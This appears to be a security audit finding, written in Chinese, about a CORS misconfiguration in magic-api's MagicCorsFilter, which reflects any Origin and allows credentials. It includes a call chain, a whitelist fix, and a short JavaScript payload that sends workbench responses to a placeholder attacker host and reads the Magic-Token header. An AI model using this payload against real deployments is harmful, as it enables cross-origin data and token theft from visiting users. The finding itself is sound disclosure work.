## F-08 — CORS 反射任意 Origin 并允许携带凭证（工作台路径）

**Severity:** LOW  |  **Likelihood:** medium  |  **Impact:** medium  |  **Confidence:** high

### 描述

MagicCorsFilter.process（对每个 MagicController 请求执行）无条件执行：response.setHeader("Access-Control-Allow-Origin", request.getHeader("Origin"))——直接回显任意 Origin；response.setHeader("Access-Control-Allow-Credentials", "true")；Access-Control-Allow-Headers/Methods 也按攻击者请求头回显。/login 成功时通过 Access-Control-Expose-Headers: Magic-Token 暴露 token 头。组合效果：任意恶意站点可在受害者浏览器中读取默认（无认证）工作台的响应；在配置了认证的部署下，若诱导用户在恶意页面提交其凭证（钓鱼表单）到 /login，恶意页面可跨域读取响应头拿到 Magic-Token 并随后操作整个工作台。因工作台认证基于自定义头而非 Cookie，经典 CSRF 不成立，实际风险受钓鱼/凭证收集前提限制，故评为低危（防御纵深缺陷）。

### 根因

MagicCorsFilter.process 将请求 Origin 头原样回显到 Access-Control-Allow-Origin 并开启 Allow-Credentials。

### 预期行为

CORS 过滤器用于允许 magic-editor 前端跨域访问工作台，本应基于配置的白名单 Origin 列表进行校验。

### 利用前提

- [user_interaction] 受害者需访问恶意页面（针对读取/凭证钓鱼场景）。

### 调用链

1. [entrypoint] `magic-api/src/main/java/org/ssssssss/magicapi/core/config/MagicCorsFilter.java:10` `process` — 每个工作台请求进入 MagicCorsFilter.process。
2. [propagation] `magic-api/src/main/java/org/ssssssss/magicapi/core/config/MagicCorsFilter.java:12` `process` — String value = request.getHeader(HttpHeaders.ORIGIN) —— 攻击者完全可控。
3. [sink] `magic-api/src/main/java/org/ssssssss/magicapi/core/config/MagicCorsFilter.java:13` `process` — response.setHeader(ACCESS_CONTROL_ALLOW_ORIGIN, value) + 第 14 行 ACCESS_CONTROL_ALLOW_CREDENTIALS: true —— 任意 Origin 获得带凭证跨域读取许可。

### 复现

**攻击者视角：** 诱导受害者浏览器访问恶意网页的攻击者。

**步骤：**

1. 在恶意页面用 fetch 以受害者浏览器身份请求工作台只读接口并外带数据。
2. 或钓鱼收集凭证后提交 /login 并读取 Magic-Token 头。

**Payload：**

```
fetch('http://victim:9999/magic/resource', {credentials:'include'}).then(r=>r.text()).then(t=>fetch('http://attacker/exfil?t='+encodeURIComponent(t)))
fetch('http://victim:9999/magic/login', {method:'POST', credentials:'include', body:'username=x&password=y'}) → 读取响应头 Magic-Token（Access-Control-Expose-Headers 已放行）
```

**预期结果：** 默认无认证部署：脚本/资源内容被外带；配置认证部署：token 头被读取。

### 评级理由

- Likelihood (medium): MagicCorsFilter 对工作台所有请求（含 /login）无条件反射 Origin 为 Access-Control-Allow-Origin 并置 Access-Control-Allow-Credentials: true；该行为始终存在。
- Impact (medium): 认证用 Magic-Token 自定义头而非 Cookie，跨站浏览器不会自动携带 token，因此无法直接完成经典 CSRF；但任意恶意网页可读取默认（无认证）工作台接口的响应内容，并可通过驱动用户浏览器向 /login 提交已知/钓鱼凭证后读取 Magic-Token 响应头，实现跨域 token 窃取与工作台操作。
- Confidence (high): MagicCorsFilter.process 逐行可读：ACAO=Origin 回显、ACAC=true、ACAH 回显请求头；/login 响应显式设置 Access-Control-Expose-Headers: Magic-Token。

### 修复建议

基于配置的 Origin 白名单校验，未命中时不设置 ACAO/ACAC；移除对 Access-Control-Allow-Headers 的整头回显，改为固定白名单。

`magic-api/src/main/java/org/ssssssss/magicapi/core/config/MagicCorsFilter.java`

```java
String value = request.getHeader(HttpHeaders.ORIGIN);
if (StringUtils.isNotBlank(value) && allowedOrigins.contains(value)) {
	response.setHeader(HttpHeaders.ACCESS_CONTROL_ALLOW_ORIGIN, value);
	response.setHeader(HttpHeaders.ACCESS_CONTROL_ALLOW_CREDENTIALS, Constants.CONST_STRING_TRUE);
}
```


---

